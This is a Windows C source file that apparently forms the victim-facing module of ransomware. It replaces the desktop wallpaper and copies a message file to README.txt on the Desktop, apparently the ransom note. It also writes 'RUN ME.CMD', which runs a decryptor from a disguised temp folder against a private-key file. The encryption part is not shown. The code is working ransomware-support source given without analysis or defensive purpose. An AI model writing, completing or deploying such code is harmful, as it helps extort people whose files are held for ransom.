#include <Windows.h>
#include <stdio.h>
#include <shlobj.h> // for SHGetFolderPath



BOOL CheckFileExist(char* filePath) {
	FILE* pFile;
	if (fopen_s(&pFile, filePath, "r") == 0) {
		fclose(pFile);
		return TRUE;
	}
	return FALSE;
}



BOOL changeBackground() {
	char* currentPath = (char*)calloc(MAX_PATH + 1, 1);

	if (currentPath != NULL) {
		if (GetCurrentDirectoryA(MAX_PATH, currentPath) > 0) {
			strcat_s(currentPath, MAX_PATH, "\\background.bmp");
			//printf("[X] Background: %s\n", currentPath);
			if (CheckFileExist(currentPath)) {
				BOOL returnVal = SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, currentPath, SPIF_UPDATEINIFILE);
				free(currentPath);
				return returnVal;
			}
		}
		free(currentPath);
	}
	return FALSE;
}

BOOL userInteraction() {
	if (changeBackground())
		printf("[i] changeBackground OK\n");
	else
		printf("[i] changeBackground Fail\n");
	// msg
	// change background 

	return FALSE;
}


// RUN ME.CMD

BOOL createCmdScript() {
	FILE* pFile;
	char* fileName = (char*)calloc(MAX_PATH, 1);
	if (fileName != NULL) {
		SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, fileName); // check value !!
		
		const char* fileStrREADME = "\\RUN ME.CMD"; // fileStrREADME
		char* runMeStr = (char*)calloc(MAX_PATH, 1);
		if (runMeStr != NULL) {
			sprintf_s(runMeStr, MAX_PATH, "%s\\README.txt", fileName);
			printf("%s\n", runMeStr);

			CopyFileA("msg.txt", runMeStr, FALSE);
			free(runMeStr);
		}

		strcat_s(fileName, MAX_PATH, fileStrREADME);
		printf("%s\n", fileName);
		if (fopen_s(&pFile, fileName, "w") == 0) {
			const char* str = {
				"@echo off\n"
				"cd %temp%\\Report.FCA679CF-9BFB\n"
				"dmp-40423.exe -r %USERPROFILE%\\Desktop\\PriKey.crt\n"
			};
			fwrite(str, strlen(str), 1, pFile);
			fclose(pFile);
			free(fileName);
			return TRUE;
		}
		free(fileName);
	}
	return FALSE;
}